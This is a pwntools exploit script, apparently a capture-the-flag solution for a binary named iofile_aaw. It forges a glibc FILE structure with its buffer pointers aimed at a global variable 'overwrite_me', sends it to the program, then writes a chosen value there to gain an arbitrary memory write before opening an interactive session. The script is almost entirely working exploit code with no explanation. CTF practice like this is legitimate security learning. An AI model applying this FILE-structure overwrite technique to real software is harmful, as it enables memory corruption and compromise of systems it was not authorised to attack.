from pwn import *
def slog(title, context): log.success(f'{title} : {hex(context)}')
context.clear(arch='amd64')

# p = remote("host3.dreamhack.games", 14381)
p = process('./iofile_aaw')
e = ELF("./iofile_aaw")
libc = ELF("./libc.so.6")

sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
rvu = lambda x : p.recvuntil(x)

overwrite = e.sym['overwrite_me']
slog('overwrite_me', overwrite)

fileStr = FileStructure()
fileStr.flags = 0xfbad2488
fileStr._IO_buf_base = overwrite
fileStr._IO_buf_end = overwrite + 1024
# print(fileStr)

payload = bytes(fileStr)
sla(b'Data :', payload)
sl(p64(0xDEADBEEF) + b"\x00"*1024)

p.interactive()